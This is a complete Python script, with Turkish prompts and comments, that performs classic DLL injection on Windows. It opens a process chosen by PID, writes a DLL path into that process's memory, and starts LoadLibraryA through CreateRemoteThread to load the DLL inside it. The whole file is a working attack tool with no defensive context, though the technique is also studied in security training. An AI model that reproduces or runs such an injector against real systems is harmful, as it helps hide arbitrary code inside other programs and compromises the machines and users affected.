import sys
from ctypes import *

print("--- PROCESS INJECTION (DLL INJECTOR) ---")
print("UYARI: Bu kod sadece 32-bit Python ile 32-bit hedefte veya 64-bit ile 64-bit hedefte çalışır.")

PAGE_READWRITE = 0x04
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
VIRTUAL_MEM = (0x1000 | 0x2000)

kernel32 = windll.kernel32
pid = int(input("Hedef PID (Görev Yöneticisinden Notepad PID'sini bul yaz): "))
dll_path = input("DLL Dosya Yolu (örn: C:\\test\\myhack.dll): ").encode()
dll_len = len(dll_path)

# 1. Hedef süreci aç
h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)

if not h_process:
    print("❌ Süreç açılamadı. Yönetici yetkisi gerekebilir.")
    sys.exit()

# 2. Hedef süreçte bellek ayır
arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)

# 3. DLL yolunu o belleğe yaz
written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))

# 4. LoadLibraryA ile DLL'i çalıştır
h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
h_loadlib = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")

thread_id = c_ulong(0)
if kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
    print(f"✅ ENJEKSİYON BAŞARILI! Hedef PID: {pid}")
    print("DLL dosyası hedef sürecin içinde çalışıyor.")
else:
    print("❌ Enjeksiyon başarısız.")